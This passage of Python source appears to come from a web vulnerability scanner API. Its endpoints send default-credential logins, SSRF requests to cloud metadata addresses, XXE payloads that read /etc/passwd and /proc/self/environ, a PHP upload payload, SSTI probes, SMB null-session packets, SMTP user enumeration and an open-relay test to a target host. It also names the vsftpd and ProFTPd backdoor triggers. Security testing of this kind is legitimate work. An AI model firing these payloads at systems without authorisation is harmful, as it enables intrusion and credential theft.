        scan_id = str(uuid.uuid4()); save_scan(scan_id,"hydra",req.target,{"output":"skipped-external"})
        return {"scan_id":scan_id,"target":req.target,"tool":"hydra","vulnerable":False,"findings":[],"total":0,"skipped":True,"reason":"Use Password Attacks module for external targets","timestamp":datetime.datetime.utcnow().isoformat()}
    base = req.target.rstrip("/")
    # Try multiple known login paths for different lab apps
    login_paths = [
        "/login", "/login.php", "/index.php",
        "/dvwa/login.php",                        # DVWA
        "/bWAPP/login.php",                       # bWAPP
        "/mutillidae/index.php",                  # Mutillidae
        "/WebGoat/login",                         # WebGoat
        "/admin", "/admin/login", "/wp-login.php",
    ]
    # Pairs matching known lab defaults first
    weak_creds = [
        ("admin","password"),    # DVWA default
        ("admin","adminpass"),   # Mutillidae default
        ("bee","bug"),           # bWAPP default
        ("admin","admin"),
        ("admin","123456"),
        ("root","root"),
        ("test","test"),
        ("guest","guest"),
    ]
    success_indicators = ["logout","sign out","dashboard","welcome","logged in","my account","your profile","home"]
    for login_path in login_paths:
        login_url = base + login_path
        for u, p in weak_creds:
            try:
                r = _req_lib.post(login_url, data={"username":u,"password":p,"user":u,"pass":p,"Login":"Login","login":"login"}, timeout=8, verify=False, allow_redirects=True)
                if r.status_code in (200,302) and any(x in r.text.lower() for x in success_indicators):
                    vulnerable = True
                    findings.append({"detail":f"Weak default credentials accepted — {u}/{p} logs in at {login_path}","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-521","cwe_name":"Weak/Default Password","owasp":"A07:2021","remediation":"Change all default credentials immediately. Enforce password complexity and account lockout after failed attempts."})
                    break
            except: pass
        if vulnerable: break
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"hydra",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"hydra","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/ssrf")
async def scan_ssrf(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    base = _web_url(req.target).rstrip("/")
    # Top SSRF parameter names (most commonly exploited)
    params = ["url","redirect","proxy","fetch","dest","src","host","endpoint","callback","next",
              "target","path","uri","return","returnUrl","load","page","link","ref","img"]
    # Internal/cloud metadata targets
    internal_targets = [
        ("http://169.254.169.254/latest/meta-data/",          ["ami-id","instance-id","local-ipv4","security-credentials"], "AWS EC2 metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/",["project-id","instance","serviceAccounts"],                 "GCP metadata"),
        ("http://169.254.169.254/metadata/instance",          ["compute","network","subscriptionId"],                       "Azure metadata"),
        ("http://127.0.0.1/",                                 ["server: apache","server: nginx","server: iis","x-powered-by","<title>apache","<title>nginx","welcome to nginx","it works","apache2 ubuntu default"], "Localhost access"),
        ("http://localhost:8080/",                             ["tomcat","jetty","spring boot","whitelabel error","glassfish"], "Internal service :8080"),
    ]
    ssrf_headers = {**_BROWSER_HEADERS, "X-Forwarded-For":"127.0.0.1"}
    for param in params:
        for (internal_url, indicators, label) in internal_targets:
            test_url = f"{base}?{param}={internal_url}"
            try:
                r = _req_lib.get(test_url, timeout=3, verify=False, headers=ssrf_headers, allow_redirects=True)
                if r.status_code == 200 and any(ind.lower() in r.text.lower() for ind in indicators):
                    vulnerable = True
                    findings.append({
                        "detail": f"SSRF via parameter '{param}' — {label} accessible ({internal_url})",
                        "severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-918",
                        "cwe_name":"Server-Side Request Forgery","owasp":"A10:2021",
                        "remediation":"Implement URL allowlist. Block RFC-1918 private IPs and cloud metadata ranges. Reject redirects to internal addresses."
                    })
                    break
            except: pass
            if vulnerable: break
        if vulnerable: break
    # Blind SSRF: check for open redirect that reaches internal (Location must START WITH the internal addr)
    # Don't check "in loc" — sites often echo the test URL as a query param in Location, which is a false positive
    _internal_prefixes = ("http://169.254","https://169.254","http://127.0.0.1","https://127.0.0.1",
                          "http://localhost","https://localhost","//169.254","//127.0.0.1")
    for param in ["url","redirect","next","return","callback"]:
        test_url = f"{base}?{param}=http://169.254.169.254/"
        try:
            r = _req_lib.get(test_url, timeout=3, verify=False, headers=ssrf_headers, allow_redirects=False)
            loc = r.headers.get("Location","").strip()
            if any(loc.startswith(pfx) for pfx in _internal_prefixes):
                findings.append({
                    "detail": f"Blind SSRF / Open Redirect via '{param}' — server redirects directly to internal address: {loc}",
                    "severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-918",
                    "cwe_name":"Blind SSRF","owasp":"A10:2021",
                    "remediation":"Validate redirect destinations. Never follow redirects to private/internal IP ranges."
                })
                vulnerable = True
        except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ssrf",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"ssrf","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/xxe")
async def scan_xxe(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    url = _web_url(req.target)
    headers_xml  = {"Content-Type":"application/xml","User-Agent":"Mozilla/5.0","Accept":"application/xml,text/xml,*/*"}
    headers_soap = {"Content-Type":"text/xml; charset=utf-8","SOAPAction":"test","User-Agent":"Mozilla/5.0"}
    # Multiple XXE payloads covering different parsers and content types
    payloads = [
        # Classic file read — Linux
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         headers_xml, ["root:x","nobody:x","daemon:x"], "Classic XXE — /etc/passwd read (Linux)"),
        # Windows file read
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
         headers_xml, ["[fonts]","[extensions]","for 16-bit"], "Classic XXE — win.ini read (Windows)"),
        # SOAP-based XXE (web services)
        ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>',
         headers_soap, ["root:x","nobody:x"], "SOAP XXE — /etc/passwd via SOAP envelope"),
        # Parameter entity XXE
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>',
         headers_xml, ["root:x","nobody:x"], "Parameter entity XXE"),
        # XXE via UTF-16 encoding bypass
        ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         {**headers_xml,"Content-Type":"application/xml; charset=UTF-16"}, ["root:x","nobody:x"], "UTF-16 encoded XXE bypass"),
        # /etc/hosts read (less sensitive but confirms XXE)
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
         headers_xml, ["localhost","127.0.0.1","::1"], "XXE — /etc/hosts read"),
        # /proc/self/environ — env var leakage
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
         headers_xml, ["PATH=","HOME=","USER=","PWD="], "XXE — /proc/self/environ env var leak"),
    ]
    for (payload, hdrs, indicators, label) in payloads:
        try:
            r = _req_lib.post(url, data=payload, timeout=10, verify=False, headers=hdrs)
            if any(ind in r.text for ind in indicators):
                vulnerable = True
                findings.append({
                    "detail": f"XXE confirmed: {label}",
                    "severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-611",
                    "cwe_name":"XXE Injection","owasp":"A05:2021",
                    "remediation":"Disable external entity processing. Set FEATURE_EXTERNAL_GENERAL_ENTITIES to false. Use JSON APIs where possible."
                })
        except: pass
    # Also test JSON endpoint that might parse XML internally
    try:
        r = _req_lib.post(url, data='{"data":"<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><root>&xxe;</root>"}',
                          timeout=8, verify=False, headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
        if "root:x" in r.text or "nobody:x" in r.text:
            vulnerable = True
            findings.append({
                "detail":"XXE via JSON body — backend parses XML inside JSON value",
                "severity":"CRITICAL","cvss":"9.1","cve":"N/A","cwe":"CWE-611",
                "cwe_name":"XXE via JSON","owasp":"A05:2021",
                "remediation":"Sanitize all input before passing to XML parsers. Never parse user-supplied XML from JSON fields."
            })
    except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"xxe",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"xxe","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


@app.post("/api/scan/clickjacking")
async def scan_clickjacking(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    url = _web_url(req.target)
    try:
        r = _req_lib.get(url, timeout=15, verify=False, headers=_BROWSER_HEADERS)
    except:
        scan_id = str(uuid.uuid4()); save_scan(scan_id,"clickjacking",req.target,{"output":"unreachable"})
        return {"scan_id":scan_id,"target":req.target,"tool":"clickjacking","vulnerable":False,"findings":[],"total":0,"timestamp":datetime.datetime.utcnow().isoformat()}

    xfo = r.headers.get("X-Frame-Options","").strip()
    csp = r.headers.get("Content-Security-Policy","").strip()
    csp_lower = csp.lower()

    # 1. Missing both protections — fully vulnerable
    if not xfo and "frame-ancestors" not in csp_lower:
        vulnerable = True
        findings.append({"detail":"No X-Frame-Options and no CSP frame-ancestors — page can be embedded in any iframe","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Add: X-Frame-Options: DENY\nOr CSP: frame-ancestors 'none'"})

    # 2. X-Frame-Options present but weak
    elif xfo.upper() == "SAMEORIGIN":
        findings.append({"detail":"X-Frame-Options: SAMEORIGIN — framing allowed from same origin (subdomain attacks possible)","severity":"LOW","cvss":"3.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking","owasp":"A05:2021","remediation":"Upgrade to X-Frame-Options: DENY unless same-origin framing is required."})

    # 3. ALLOW-FROM is obsolete — not supported in modern browsers
    elif xfo.upper().startswith("ALLOW-FROM"):
        vulnerable = True
        findings.append({"detail":f"X-Frame-Options: {xfo} — ALLOW-FROM is obsolete and ignored by Chrome/Firefox/Edge","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-1021","cwe_name":"Obsolete Clickjacking Protection","owasp":"A05:2021","remediation":"Replace ALLOW-FROM with CSP frame-ancestors directive which is supported by all modern browsers."})

    # 4. CSP frame-ancestors present — check if it's too permissive
    if "frame-ancestors" in csp_lower:
        if "frame-ancestors *" in csp_lower:
            vulnerable = True
            findings.append({"detail":"CSP frame-ancestors * — wildcard allows any origin to frame this page","severity":"MEDIUM","cvss":"6.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Permissive CSP","owasp":"A05:2021","remediation":"Change to: Content-Security-Policy: frame-ancestors 'none'"})
        elif "frame-ancestors 'none'" in csp_lower or "frame-ancestors \"none\"" in csp_lower:
            findings.append({"detail":"CSP frame-ancestors 'none' — strong clickjacking protection confirmed","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Protection Present","owasp":"A05:2021","remediation":"No action needed."})
        elif "frame-ancestors 'self'" in csp_lower:
            findings.append({"detail":"CSP frame-ancestors 'self' — only same-origin framing allowed","severity":"LOW","cvss":"2.1","cve":"N/A","cwe":"CWE-1021","cwe_name":"Clickjacking — Partial","owasp":"A05:2021","remediation":"Consider frame-ancestors 'none' if no legitimate framing use case."})

    # 5. Check if X-Frame-Options: DENY properly set — mark as safe
    if xfo.upper() == "DENY":
        findings.append({"detail":"X-Frame-Options: DENY — strong clickjacking protection confirmed","severity":"INFO","cvss":"0.0","cve":"N/A","cwe":"N/A","cwe_name":"Protection Present","owasp":"A05:2021","remediation":"No action needed."})

    scan_id = str(uuid.uuid4()); save_scan(scan_id,"clickjacking",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"clickjacking","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/verbtamper")
async def scan_verbtamper(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    try:
        r = _req_lib.options(_web_url(req.target),timeout=15,verify=False,headers=_BROWSER_HEADERS)
        allow = r.headers.get("Allow","")
        dangerous = [m for m in ["PUT","DELETE","TRACE","CONNECT","PATCH"] if m in allow]
        if dangerous:
            vulnerable = True
            findings.append({"detail":f"Dangerous HTTP methods allowed: {', '.join(dangerous)}","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-650","cwe_name":"HTTP Verb Tampering","owasp":"A05:2021","remediation":f"Disable methods: {', '.join(dangerous)} in server config."})
    except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"verbtamper",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"verbtamper","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/pollution")
async def scan_pollution(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    try:
        r1 = _req_lib.get(_web_url(req.target)+"?id=1",timeout=15,verify=False,headers=_BROWSER_HEADERS)
        r2 = _req_lib.get(_web_url(req.target)+"?id=1&id=2",timeout=15,verify=False,headers=_BROWSER_HEADERS)
        # Only flag if the response difference is substantial (>100 chars) — not just timestamps/session IDs
        if r1 and r2 and abs(len(r1.text)-len(r2.text)) > 100:
            vulnerable = True
            findings.append({"detail":"HTTP Parameter Pollution: duplicate 'id' parameter produces significantly different response (>100 byte difference)","severity":"MEDIUM","cvss":"5.4","cve":"N/A","cwe":"CWE-235","cwe_name":"Parameter Pollution","owasp":"A03:2021","remediation":"Validate and deduplicate all query parameters server-side. Use the first or last value consistently."})
    except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"pollution",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"pollution","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/idor")
async def scan_idor(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    base = req.target.rstrip("/")
    baseline_size = None
    is_spa = _detect_spa(req.target)
    try:
        br = _http_get(base + "/", timeout=6)
        if br and br.status_code == 200: baseline_size = len(br.content)
    except: pass
    # Generic REST API ID paths + Juice Shop specific
    id_paths = [
        "/user/1","/user/2","/account/1","/profile/1",
        "/api/user/1","/admin/user/1",
        "/rest/user/1","/rest/user/2",          # Juice Shop
        "/api/users/1","/api/users",            # Generic REST
        "/api/products","/api/products/1",      # Juice Shop
        "/api/orders","/api/baskets/1",         # Juice Shop
        "/api/challenges",                       # Juice Shop
        "/dvwa/vulnerabilities/idor/",           # DVWA
        "/mutillidae/index.php?page=user-info.php&username=admin",  # Mutillidae
    ]
    for p in id_paths:
        url = base + p
        r = _http_get(url, timeout=8)
        if r and r.status_code == 200 and len(r.text) > 30:
            ct = r.headers.get("Content-Type","").lower()
            # Skip if response matches homepage baseline — SPA false positive
            if baseline_size and len(r.content) == baseline_size: continue
            # Skip HTML responses — real IDOR endpoints return JSON
            if "text/html" in ct: continue
            if is_spa and "text/html" in ct: continue
            # Must be JSON with actual data indicators
            data_indicators = ['"id"','"email"','"username"','"user"','"role"','"password"','"token"']
            if "application/json" in ct and any(k in r.text for k in data_indicators):
                vulnerable = True
                findings.append({"detail":f"IDOR: {p} returns user/object data without authentication (HTTP 200, {len(r.text)} bytes)","severity":"HIGH","cvss":"8.1","cve":"N/A","cwe":"CWE-639","cwe_name":"IDOR / Broken Object Level Authorization","owasp":"A01:2021","remediation":"Implement object-level authorization checks on every endpoint. Verify the requesting user owns the resource."})
                if len(findings) >= 3: break
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"idor",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"idor","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/ssti")
async def scan_ssti(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    base_url = _web_url(req.target).rstrip("/")
    # Fetch baseline to filter out numbers already present on the page
    baseline = _http_get(base_url, timeout=8)
    baseline_text = baseline.text if baseline else ""
    # Each tuple: (param, math_payload, expected_result, alt_payload, alt_expected)
    # We confirm SSTI by verifying TWO different expressions both evaluate correctly
    probe_sets = [
        ("name",  "{{7*7}}",  "49", "{{13*37}}", "481"),
        ("q",     "{{7*7}}",  "49", "{{13*37}}", "481"),
        ("search","#{7*7}",   "49", "#{13*37}",  "481"),
        ("input", "{{7*7}}",  "49", "{{13*37}}", "481"),
    ]
    for param, p1, e1, p2, e2 in probe_sets:
        # Skip if expected output already exists in baseline (coincidental numbers)
        if e1 in baseline_text or e2 in baseline_text:
            continue
        url1 = f"{base_url}?{param}={p1}"
        r1 = _http_get(url1, timeout=8)
        if not r1 or e1 not in r1.text:
            continue
        # Confirm with second expression to eliminate false positives
        url2 = f"{base_url}?{param}={p2}"
        r2 = _http_get(url2, timeout=8)
        if r2 and e2 in r2.text:
            vulnerable = True
            findings.append({"detail":f"SSTI confirmed: ?{param}={p1} → '{e1}' AND ?{param}={p2} → '{e2}' both evaluated — server-side template injection is real","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-1336","cwe_name":"SSTI","owasp":"A03:2021","remediation":"Never render user input as a template. Use safe output encoding and sandboxed template engines."})
            break
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ssti",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"ssti","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/fileupload")
async def scan_fileupload(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; vulnerable = False
    base = req.target.rstrip("/")
    upload_paths = ["/upload","/file-upload","/upload.php","/fileupload","/api/upload","/admin/upload","/media/upload"]
    _unique_name = f"testfile_{uuid.uuid4().hex[:8]}.php"
    _php_payload = b"<?php echo 'PWNED_' . md5('test'); ?>"
    for p in upload_paths:
        try:
            url = base + p
            # Check the endpoint exists first — skip 404s immediately
            head = _req_lib.get(url, timeout=5, verify=False, allow_redirects=False)
            if head.status_code == 404:
                continue
            r = _req_lib.post(url, files={"file": (_unique_name, _php_payload, "application/x-php")},
                               timeout=10, verify=False)
            body = r.text.lower()
            # Only flag if the server echoes back our filename or a file URL, or explicit success JSON
            # Reject: "upload" keyword alone (URL path echo), generic 200s, redirect responses
            server_stored = (
                _unique_name.lower() in body or
                _unique_name[:8].lower() in body or
                (r.status_code in (200,201) and re.search(r'"(url|path|file|location)"\s*:\s*"[^"]*\.php"', body))
            )
            if server_stored:
                vulnerable = True
                findings.append({"detail":f"Unrestricted file upload at {p}: server accepted PHP file and returned filename/URL in response (HTTP {r.status_code})","severity":"CRITICAL","cvss":"9.8","cve":"N/A","cwe":"CWE-434","cwe_name":"Unrestricted File Upload","owasp":"A04:2021","remediation":"Whitelist allowed file types (images/docs only). Rename uploaded files server-side. Store uploads outside webroot."})
                break
        except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"fileupload",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"fileupload","vulnerable":vulnerable,"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/dataexfil")
async def scan_dataexfil(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []
    r = _http_get(_web_url(req.target), timeout=15)
    if r:
        patterns = [(r"\b\d{16}\b","Credit card number pattern"),
                    (r"\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b","Email address exposed"),
                    (r"\b(?:password|passwd|pwd)\s*[:=]\s*\S+","Password in response"),
                    (r"\b(?:api[_-]?key|apikey|secret|token)\s*[:=]\s*\S+","API key/secret exposed")]
        for pattern, desc in patterns:
            if re.search(pattern, r.text, re.IGNORECASE):
                findings.append({"detail":desc,"severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-200","cwe_name":"Data Exposure","owasp":"A02:2021","remediation":"Remove sensitive data from HTTP responses."})
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"dataexfil",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"dataexfil","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/scan/racecondition")
async def scan_racecondition(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    findings = []; responses = []
    try:
        import concurrent.futures
        def _fetch(i):
            try:
                r = _req_lib.get(_web_url(req.target),timeout=5,verify=False,headers=_BROWSER_HEADERS)
                return r.status_code
            except: return 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            responses = list(ex.map(_fetch, range(10)))
        codes = [c for c in responses if c != 0]
        unique = set(codes)
        # Only flag if there is a mix of success (2xx) and error (5xx) codes — real race condition indicator
        has_success = any(200<=c<300 for c in codes)
        has_server_error = any(500<=c<600 for c in codes)
        if has_success and has_server_error:
            vulnerable = True
            findings.append({"detail":f"Possible race condition: concurrent requests produce both 2xx and 5xx responses {unique} — server may not handle concurrent access safely","severity":"MEDIUM","cvss":"6.8","cve":"N/A","cwe":"CWE-362","cwe_name":"Race Condition","owasp":"A04:2021","remediation":"Implement proper locking and atomic transactions. Use database-level constraints for shared resources."})
    except: pass
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"racecondition",req.target,{"output":str(findings)})
    return {"scan_id":scan_id,"target":req.target,"tool":"racecondition","vulnerable":bool(findings),"findings":findings,"total":len(findings),"timestamp":datetime.datetime.utcnow().isoformat()}


# ══════════════════════════════════════════════════════════════
#  NEW OSCP TOOLS — SMB, FTP, SMTP, SNMP, EXPLOIT SEARCH
#  Pure Python — zero Kali dependencies
# ══════════════════════════════════════════════════════════════

import ftplib as _ftplib, smtplib as _smtplib, struct as _struct2

# ─── SMB ENUMERATION ──────────────────────────────────────────

def _smb_null_session(host: str, port: int = 445) -> bool:
    """Test SMB null session via raw SMB1 negotiate packet"""
    try:
        s = _socket_lib.socket(_socket_lib.AF_INET, _socket_lib.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        # SMB1 Negotiate Protocol Request (known-good bytes)
        dialects = b"\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00"
        byte_count = len(dialects)
        smb_data = (
            b"\xffSMB\x72"                              # Header + Negotiate cmd
            b"\x00\x00\x00\x00"                         # Status
            b"\x18\x01\x28"                             # Flags
            b"\x00\x00"                                  # PID High
            b"\x00\x00\x00\x00\x00\x00\x00\x00"        # Signature (8 bytes)
            b"\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00" # Reserved/TID/PID/UID/MID
            b"\x00"                                      # Word Count
            + _struct2.pack("<H", byte_count)            # Byte Count
            + dialects
        )
        nb_len = _struct2.pack(">I", len(smb_data))
        s.send(b"\x00" + nb_len[1:] + smb_data)
        resp = s.recv(1024)
        s.close()
        return len(resp) > 8 and b"SMB" in resp
    except:
        return False


@app.post("/api/scan/smb")
async def scan_smb(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    host = _recon_host(req.target)
    findings = []; smb_open = False; smb_port = None
    for port in [445, 139]:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=3)
            smb_open = True; smb_port = port
            try: w.close(); await w.wait_closed()
            except: pass
            break
        except: pass
    if smb_open:
        findings.append({"detail":f"SMB service open on {host}:{smb_port} — Windows/Samba file sharing exposed","severity":"HIGH","cvss":"7.5","cve":"N/A","cwe":"CWE-200","cwe_name":"SMB Exposure","owasp":"A05:2021","remediation":"Block ports 445/139 from external access. Use VPN for file sharing."})
        loop = asyncio.get_event_loop()
        null_ok = await loop.run_in_executor(None, _smb_null_session, host, smb_port)
        if null_ok:
            findings.append({"detail":"SMB null session allowed — anonymous enumeration of shares/users/OS info is possible","severity":"CRITICAL","cvss":"9.1","cve":"CVE-2017-0143","cwe":"CWE-306","cwe_name":"Missing Authentication","owasp":"A07:2021","remediation":"Disable null sessions: RestrictAnonymous=2 in Windows registry. Patch SMBv1."})
    out = f"SMB open on port {smb_port}" if smb_open else "SMB ports 445/139 closed"
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"smb",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"smb","smb_open":smb_open,"port":smb_port,"findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


# ─── FTP ENUMERATION ──────────────────────────────────────────

@app.post("/api/scan/ftp")
async def scan_ftp(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    host = _recon_host(req.target)
    findings = []; ftp_open = False; banner = ""; anon_ok = False; files = []
    loop = asyncio.get_event_loop()

    def _ftp_probe():
        nonlocal ftp_open, banner, anon_ok, files
        try:
            ftp = _ftplib.FTP(timeout=8)
            ftp.connect(host, 21)
            ftp_open = True
            banner = ftp.getwelcome()[:200]
            # Test anonymous login
            try:
                ftp.login("anonymous", "guest@guest.com")
                anon_ok = True
                try:
                    ftp.retrlines("LIST", lambda l: files.append(l))
                except: pass
                ftp.quit()
            except _ftplib.error_perm:
                ftp.quit()
        except: pass

    await loop.run_in_executor(None, _ftp_probe)

    if ftp_open:
        findings.append({"detail":f"FTP service open — banner: {banner[:100]}","severity":"MEDIUM","cvss":"5.3","cve":"N/A","cwe":"CWE-319","cwe_name":"Cleartext Transmission","owasp":"A02:2021","remediation":"Replace FTP with SFTP or FTPS. FTP transmits credentials in plaintext."})
        # Check for vulnerable versions in banner
        banner_l = banner.lower()
        if "vsftpd 2.3.4" in banner_l:
            findings.append({"detail":"vsftpd 2.3.4 detected — backdoor vulnerability (CVE-2011-2523): username with ':)' opens root shell on port 6200","severity":"CRITICAL","cvss":"10.0","cve":"CVE-2011-2523","cwe":"CWE-78","cwe_name":"OS Command Injection","owasp":"A06:2021","remediation":"Upgrade vsftpd immediately. This backdoor gives unauthenticated root shell."})
        if "proftpd 1.3.3" in banner_l:
            findings.append({"detail":"ProFTPd 1.3.3c detected — backdoor (CVE-2010-4221): HELP ACIDBITCHEZ gives root shell","severity":"CRITICAL","cvss":"10.0","cve":"CVE-2010-4221","cwe":"CWE-78","cwe_name":"OS Command Injection","owasp":"A06:2021","remediation":"Upgrade ProFTPd immediately."})
        if anon_ok:
            findings.append({"detail":f"Anonymous FTP login allowed — {len(files)} item(s) accessible without credentials","severity":"HIGH","cvss":"8.6","cve":"N/A","cwe":"CWE-306","cwe_name":"Anonymous FTP","owasp":"A07:2021","remediation":"Disable anonymous FTP access. Require authentication for all FTP connections."})

    out = f"FTP open: {banner}\nAnonymous: {anon_ok}\nFiles: {files[:10]}" if ftp_open else "FTP port 21 closed"
    scan_id = str(uuid.uuid4()); save_scan(scan_id,"ftp",req.target,{"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"ftp","ftp_open":ftp_open,"banner":banner,"anonymous_allowed":anon_ok,"files":files[:20],"findings":findings,"total":len(findings),"raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}


# ─── SMTP USER ENUMERATION ────────────────────────────────────

_SMTP_USERS = ["root","admin","administrator","postmaster","info","test","user","mail","support","webmaster","no-reply","noreply","abuse","hostmaster","security"]

@app.post("/api/scan/smtp")
async def scan_smtp(req: ScanRequest, user=Depends(verify_scan_quota)):
    _AUTH_CTX.set(req)
    host = _recon_host(req.target)
    findings = []; smtp_open = False; banner = ""; valid_users = []; open_relay = False
    loop = asyncio.get_event_loop()

    def _smtp_probe():
        nonlocal smtp_open, banner, valid_users, open_relay
        for port in [25, 587, 465]:
            try:
                s = _socket_lib.socket(_socket_lib.AF_INET, _socket_lib.SOCK_STREAM)
                s.settimeout(8)
                s.connect((host, port))
                smtp_open = True
                data = s.recv(1024).decode("utf-8", errors="replace").strip()
                banner = data[:200]
                # VRFY user enumeration
                for user in _SMTP_USERS:
                    try:
                        s.send(f"VRFY {user}\r\n".encode())
                        resp = s.recv(512).decode("utf-8", errors="replace")
                        if resp.startswith("250") or resp.startswith("252"):
                            valid_users.append(user)
                    except: pass
                # Test open relay
                try:
                    s.send(b"EHLO test.com\r\n"); s.recv(512)
                    s.send(b"MAIL FROM:<test@evil.com>\r\n"); r1 = s.recv(512).decode("utf-8", errors="replace")
                    s.send(b"RCPT TO:<victim@external.com>\r\n"); r2 = s.recv(512).decode("utf-8", errors="replace")
                    if r1.startswith("250") and r2.startswith("250"):
                        open_relay = True
                except: pass
                s.send(b"QUIT\r\n")
                s.close()
                break
            except: pass

    await loop.run_in_executor(None, _smtp_probe)

    if smtp_open:
